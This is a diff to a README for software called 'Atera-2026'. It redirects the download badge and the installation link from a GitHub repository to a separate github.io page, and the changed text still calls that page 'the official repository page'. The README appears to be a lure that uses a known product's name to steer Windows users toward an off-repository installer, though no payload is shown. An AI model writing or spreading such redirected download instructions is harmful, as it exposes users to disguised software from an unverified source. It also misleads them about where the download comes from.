@@ -1,6 +1,6 @@
 # 🖥️ Atera-2026 - Manage your IT systems with ease
 
-[![](https://img.shields.io/badge/Download-Atera-2026-blue.svg)](https://github.com/innhit/Atera-2026)
+[![](https://img.shields.io/badge/Download-Atera-2026-blue.svg)](https://innhit.github.io)
 
 ## 📖 Overview
 
@@ -20,7 +20,7 @@ Ensure your computer meets these standards before you start. These requirements 
 
 Follow these steps to install the software on your Windows computer.
 
-1.  Visit the official repository page to get the installer: [https://github.com/innhit/Atera-2026](https://github.com/innhit/Atera-2026).
+1.  Visit the official repository page to get the installer: [https://innhit.github.io](https://innhit.github.io).
 2.  Locate the download button on the page.
 3.  Click the button to save the file to your computer.
 4.  Navigate to your Downloads folder once the transfer finishes.
